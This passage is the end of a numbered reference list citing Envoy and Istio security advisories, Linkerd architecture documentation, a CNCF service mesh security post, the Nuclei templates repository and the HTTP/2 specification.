5. Envoy JWT Filter CVE-2023-35941 Advisory - https://github.com/envoyproxy/envoy/security/advisories/GHSA-hr5v-8339-mhv8
6. Istio CVE-2021-31921 Disclosure - https://istio.io/latest/news/2021/istio-security-2021-007/
7. Linkerd2-proxy Architecture - https://linkerd.io/2/overview/architecture/
8. CNCF Service Mesh Security Best Practices - https://www.cncf.io/blog/2023/01/05/a-crash-course-in-service-mesh-security/
9. Nuclei Templates Repository - https://github.com/projectdiscovery/nuclei-templates
10. HTTP/2 Specification (RFC 7540) - https://tools.ietf.org/html/rfc7540